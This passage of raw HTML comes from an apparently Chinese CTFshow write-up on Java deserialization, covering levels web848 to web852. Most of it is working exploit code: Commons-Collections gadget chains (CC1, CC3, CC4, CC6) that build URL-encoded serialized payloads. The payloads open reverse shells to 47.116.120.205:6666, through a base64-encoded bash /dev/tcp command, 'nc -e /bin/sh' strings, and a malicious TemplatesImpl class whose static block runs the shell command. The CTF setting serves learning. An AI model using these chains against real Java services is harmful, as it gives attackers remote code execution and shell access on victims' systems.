punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Object</span> o <span class="token operator">=</span> annotationInvocationHandlerConstructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token class-name">Target</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> transformedMap<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">serialize</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">ByteArrayOutputStream</span> byteArrayOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>byteArrayOutputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>    oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>    oos<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> serializedBytes <span class="token operator">=</span> byteArrayOutputStream<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">String</span> base64Encoded <span class="token operator">=</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encodeToString</span><span class="token punctuation">(</span>serializedBytes<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">StringBuilder</span> encodedBuilder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">char</span> c <span class="token operator">:</span> base64Encoded<span class="token punctuation">.</span><span class="token function">toCharArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        encodedBuilder<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"%"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">toHexString</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token class-name">String</span> encodedURL <span class="token operator">=</span> encodedBuilder<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>encodedURL<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p><img src="/%5Cimages%5Cposts%5CCTFshow-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%5C1726486599677.jpg"></p><h1 id="web848"><a href="#web848" class="headerlink" title="web848"></a>web848</h1><p>禁用了<code>TransformedMap</code>类，之前CC1还有一条<code>LacyMap</code>链</p><pre class="language-none"><code class="language-none">    public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException &#123;        Transformer[] transformers &#x3D; new Transformer[]&#123;                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMTYuMTIwLjIwNS82NjY2IDA+JjE&#x3D;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;&#125;)        &#125;;        ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(transformers);        HashMap&lt;Object,Object&gt; map &#x3D; new HashMap&lt;&gt;();        map.put(&quot;value&quot;,&quot;admin123&quot;);        Map&lt;Object,Object&gt; layzMap &#x3D; LazyMap.decorate(map, chainedTransformer);&#x2F;&#x2F;        layzMap.get(&quot;机器猫&quot;);        Class c &#x3D; Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);        Constructor annotationInvocationHandlerConstructor &#x3D; c.getDeclaredConstructor(Class.class, Map.class);        annotationInvocationHandlerConstructor.setAccessible(true);        InvocationHandler invocationHandler &#x3D; (InvocationHandler) annotationInvocationHandlerConstructor.newInstance(Override.class,layzMap);        Map o &#x3D; (Map) Proxy.newProxyInstance(layzMap.getClass().getClassLoader(), layzMap.getClass().getInterfaces(), invocationHandler);        Object o1 &#x3D; annotationInvocationHandlerConstructor.newInstance(Override.class, o);        serialize(o1);    &#125;    public static void serialize(Object obj) throws IOException &#123;        ByteArrayOutputStream byteArrayOutputStream &#x3D; new ByteArrayOutputStream();        ObjectOutputStream oos &#x3D; new ObjectOutputStream(byteArrayOutputStream);        oos.writeObject(obj);        oos.close();        byte[] serializedBytes &#x3D; byteArrayOutputStream.toByteArray();        String base64Encoded &#x3D; Base64.getEncoder().encodeToString(serializedBytes);        StringBuilder encodedBuilder &#x3D; new StringBuilder();        for (char c : base64Encoded.toCharArray()) &#123;            encodedBuilder.append(&quot;%&quot;).append(Integer.toHexString(c).toUpperCase());        &#125;        String encodedURL &#x3D; encodedBuilder.toString();        System.out.println(encodedURL);    &#125;</code></pre><p><img src="/%5Cimages%5Cposts%5CCTFshow-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%5C1726486888881.jpg"></p><h1 id="web849"><a href="#web849" class="headerlink" title="web849"></a>web849</h1><p><strong>commons-collections 4.0</strong>可以用CC4链打，题目开启界面提示可以用nc打</p><pre class="language-none"><code class="language-none">package org.example;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;import org.apache.commons.collections4.Transformer;import org.apache.commons.collections4.comparators.TransformingComparator;import org.apache.commons.collections4.functors.ChainedTransformer;import org.apache.commons.collections4.functors.ConstantTransformer;import org.apache.commons.collections4.functors.InstantiateTransformer;import javax.xml.transform.Templates;import java.io.ByteArrayOutputStream;import java.io.IOException;import java.io.ObjectOutputStream;import java.lang.reflect.*;import java.nio.file.Files;import java.nio.file.Paths;import java.util.Base64;import java.util.PriorityQueue;public class ctfshow &#123;    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException, InvocationTargetException, InstantiationException, NoSuchMethodException &#123;        TemplatesImpl templates &#x3D; new  TemplatesImpl();        Class c &#x3D; templates.getClass();        Field nameField &#x3D; c.getDeclaredField(&quot;_name&quot;);        nameField.setAccessible(true);        nameField.set(templates,&quot;admin&quot;);        Field bytecodeField &#x3D; c.getDeclaredField(&quot;_bytecodes&quot;);        bytecodeField.setAccessible(true);        byte[] code &#x3D; Files.readAllBytes(Paths.get(&quot;D:\\桌面\\note\\ClassLoaderTest.class\\&quot;));        byte[][] codes &#x3D; &#123;code&#125;;        bytecodeField.set(templates,codes);        InstantiateTransformer instantiateTransformer &#x3D; new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,new Object[]&#123;templates&#125;);        Transformer[] transformers &#x3D; new Transformer[]&#123;                new ConstantTransformer(TrAXFilter.class),                instantiateTransformer        &#125;;        ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(transformers);        TransformingComparator transformingComparator &#x3D; new TransformingComparator(new ChainedTransformer());        PriorityQueue priorityQueue &#x3D; new PriorityQueue&lt;&gt;(transformingComparator);        priorityQueue.add(3);        priorityQueue.add(2);        Class transformingComparatorClass &#x3D; transformingComparator.getClass();        Field declaredField &#x3D; transformingComparatorClass.getDeclaredField(&quot;transformer&quot;);        declaredField.setAccessible(true);        declaredField.set(transformingComparator,chainedTransformer);        serialize(priorityQueue);    &#125;    public static void serialize(Object obj) throws IOException &#123;        ByteArrayOutputStream byteArrayOutputStream &#x3D; new ByteArrayOutputStream();        ObjectOutputStream oos &#x3D; new ObjectOutputStream(byteArrayOutputStream);        oos.writeObject(obj);        oos.close();        byte[] serializedBytes &#x3D; byteArrayOutputStream.toByteArray();        String base64Encoded &#x3D; Base64.getEncoder().encodeToString(serializedBytes);        StringBuilder encodedBuilder &#x3D; new StringBuilder();        for (char c : base64Encoded.toCharArray()) &#123;            encodedBuilder.append(&quot;%&quot;).append(Integer.toHexString(c).toUpperCase());        &#125;        String encodedURL &#x3D; encodedBuilder.toString();        System.out.println(encodedURL);    &#125;&#125;</code></pre><h1 id="web850"><a href="#web850" class="headerlink" title="web850"></a>web850</h1><p>用之前的CC3链。CC3链的<code>TrAXFilter</code>和<code>LazyMap</code>打。这里环境是Java7，恶意类要用Java7来编译。</p><pre class="language-Java" data-language="Java"><code class="language-Java">package org.example;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InstantiateTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.LazyMap;import org.apache.commons.collections.map.TransformedMap;import javax.xml.transform.Templates;import java.io.ByteArrayOutputStream;import java.io.IOException;import java.io.ObjectOutputStream;import java.lang.annotation.Target;import java.lang.reflect.*;import java.nio.file.Files;import java.nio.file.Paths;import java.util.Base64;import java.util.HashMap;import java.util.Map;public class ctfshow &#123;    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException, InvocationTargetException, InstantiationException, NoSuchMethodException &#123;        TemplatesImpl templates &#x3D; new  TemplatesImpl();        Class aClass &#x3D; templates.getClass();        Field nameField &#x3D; aClass.getDeclaredField(&quot;_name&quot;);        nameField.setAccessible(true);        nameField.set(templates,&quot;admin&quot;);        Field bytecodeField &#x3D; aClass.getDeclaredField(&quot;_bytecodes&quot;);        bytecodeField.setAccessible(true);        byte[] code &#x3D; Files.readAllBytes(Paths.get(&quot;D:\\桌面\\note\\ClassLoaderTest.class\\&quot;));        byte[][] codes &#x3D; &#123;code&#125;;        bytecodeField.set(templates,codes);        InstantiateTransformer instantiateTransformer &#x3D; new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,new Object[]&#123;templates&#125;);        Transformer[] transformers &#x3D; new Transformer[]&#123;                new ConstantTransformer(TrAXFilter.class),                instantiateTransformer        &#125;;        ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(transformers);        HashMap&lt;Object,Object&gt; map &#x3D; new HashMap&lt;&gt;();        map.put(&quot;value&quot;,&quot;admin123&quot;);        Map&lt;Object,Object&gt; layzMap &#x3D; LazyMap.decorate(map, chainedTransformer);&#x2F;&#x2F;        layzMap.get(&quot;机器猫&quot;);        Class c &#x3D; Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);        Constructor annotationInvocationHandlerConstructor &#x3D; c.getDeclaredConstructor(Class.class, Map.class);        annotationInvocationHandlerConstructor.setAccessible(true);        InvocationHandler invocationHandler &#x3D; (InvocationHandler) annotationInvocationHandlerConstructor.newInstance(Override.class,layzMap);        Map o &#x3D; (Map) Proxy.newProxyInstance(layzMap.getClass().getClassLoader(), layzMap.getClass().getInterfaces(), invocationHandler);        Object o1 &#x3D; annotationInvocationHandlerConstructor.newInstance(Override.class, o);        serialize(o1);    &#125;    public static void serialize(Object obj) throws IOException &#123;        ByteArrayOutputStream byteArrayOutputStream &#x3D; new ByteArrayOutputStream();        ObjectOutputStream oos &#x3D; new ObjectOutputStream(byteArrayOutputStream);        oos.writeObject(obj);        oos.close();        byte[] serializedBytes &#x3D; byteArrayOutputStream.toByteArray();        String base64Encoded &#x3D; Base64.getEncoder().encodeToString(serializedBytes);        StringBuilder encodedBuilder &#x3D; new StringBuilder();        for (char c : base64Encoded.toCharArray()) &#123;            encodedBuilder.append(&quot;%&quot;).append(Integer.toHexString(c).toUpperCase());        &#125;        String encodedURL &#x3D; encodedBuilder.toString();        System.out.println(encodedURL);    &#125;&#125;</code></pre><p>恶意类：</p><pre class="language-Java" data-language="Java"><code class="language-Java">import java.io.IOException;import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;public class ClassLoaderTest extends AbstractTranslet&#123;    static &#123;        try &#123;            Runtime.getRuntime().exec(&quot;nc 47.116.120.205 6666 -e &#x2F;bin&#x2F;sh&quot;);        &#125; catch (IOException e) &#123;            e.printStackTrace();        &#125;    &#125;    @Override    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;    &#125;    @Override    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;    &#125;&#125;</code></pre><h1 id="web851"><a href="#web851" class="headerlink" title="web851"></a>web851</h1><p>把CC6链进行修改，导包导<code>org.apache.commons.collections4</code>,<code>decorate</code>换成<code>lazyMap</code>。用nc弹</p><pre class="language-Java" data-language="Java"><code class="language-Java">package org.example;import org.apache.commons.collections4.Transformer;import org.apache.commons.collections4.functors.ChainedTransformer;import org.apache.commons.collections4.functors.ConstantTransformer;import org.apache.commons.collections4.functors.InvokerTransformer;import org.apache.commons.collections4.keyvalue.TiedMapEntry;import org.apache.commons.collections4.map.LazyMap;import java.io.ByteArrayOutputStream;import java.io.IOException;import java.io.ObjectOutputStream;import java.lang.reflect.*;import java.util.Base64;import java.util.HashMap;import java.util.Map;public class ctfshow &#123;    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;        Transformer[] transformers &#x3D; new Transformer[]&#123;                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;nc 47.116.120.205 6666 -e &#x2F;bin&#x2F;sh&quot;&#125;)        &#125;;        ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(transformers);        HashMap&lt;Object,Object&gt; map &#x3D; new HashMap&lt;&gt;();        Map&lt;Object,Object&gt; layzMap &#x3D; LazyMap.lazyMap(map, new ConstantTransformer(1));        TiedMapEntry tiedMapEntry &#x3D; new TiedMapEntry(layzMap, &quot;test&quot;);        HashMap&lt;Object,Object&gt; hashMap &#x3D; new  HashMap&lt;&gt;();        hashMap.put(tiedMapEntry,&quot;bbb&quot;);        layzMap.remove(&quot;test&quot;);        Class&lt;LazyMap&gt; lazyMapClass &#x3D; LazyMap.class;        Field factoryField &#x3D; lazyMapClass.getDeclaredField(&quot;factory&quot;);        factoryField.setAccessible(true);        factoryField.set(layzMap,chainedTransformer);        serialize(hashMap);    &#125;    public static void serialize(Object obj) throws IOException &#123;        ByteArrayOutputStream byteArrayOutputStream &#x3D; new ByteArrayOutputStream();        ObjectOutputStream oos &#x3D; new ObjectOutputStream(byteArrayOutputStream);        oos.writeObject(obj);        oos.close();        byte[] serializedBytes &#x3D; byteArrayOutputStream.toByteArray();        String base64Encoded &#x3D; Base64.getEncoder().encodeToString(serializedBytes);        StringBuilder encodedBuilder &#x3D; new StringBuilder();        for (char c : base64Encoded.toCharArray()) &#123;            encodedBuilder.append(&quot;%&quot;).append(Integer.toHexString(c).toUpperCase());        &#125;        String encodedURL &#x3D; encodedBuilder.toString();        System.out.println(encodedURL);    &#125;&#125;</code></pre><h1 id="web852"><a href="#web852" class="headerlink" title="web852"></a>web852</h1><p>上一关的链子可以直接用</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ChainedTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>keyvalue<span class="token punctuation">.</span></span><span class="token class-name">TiedMapEntry</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">LazyMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayOutputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectOutputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Base64</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> ctfshow <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchFieldException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"nc 47.116.120.205 6666 -e /bin/sh"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token class-name">ChainedTransformer</span> chainedTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">></span></span> map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">></span></span> layzMap <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">lazyMap</span><span class="token punctuation">(</span>map<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">TiedMapEntry</span> tiedMapEntry <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TiedMapEntry</span><span class="token punctuation">(</span>layzMap<span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">></span></span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span>  <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        hashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>tiedMapEntry<span class="token punctuation">,</span><span class="token string">"bbb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        layzMap<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">LazyMap</span><span class="token punctuation">></span></span> lazyMapClass <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>        <span class="token class-name">Field</span> factoryField <span class="token operator">=</span> lazyMapClass<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"factory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        factoryField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        factoryField<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>layzMap<span class="token punctuation">,</span>chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">serialize</span><span class="token punctuation">(</span>hashMap<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">ByteArrayOutputStream</span> byteArrayOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>byteArrayOutputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>        oos<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> serializedBytes <span class="token operator">=</span> byteArrayOutputStream<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> base64Encoded <span class="token operator">=</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encodeToString</span><span class="token punctuation">(</span>serializedBytes<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">StringBuilder</span> encodedBuilder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">char</span> c <span class="token operator">:</span> base64Encoded<span class="token punctuation">.</span><span class="token function">toCharArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            encodedBuilder<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"%"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">toHexString</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token class-name">String</span> encodedURL <span class="token operator">=</span> encodedBuilder<span class="token 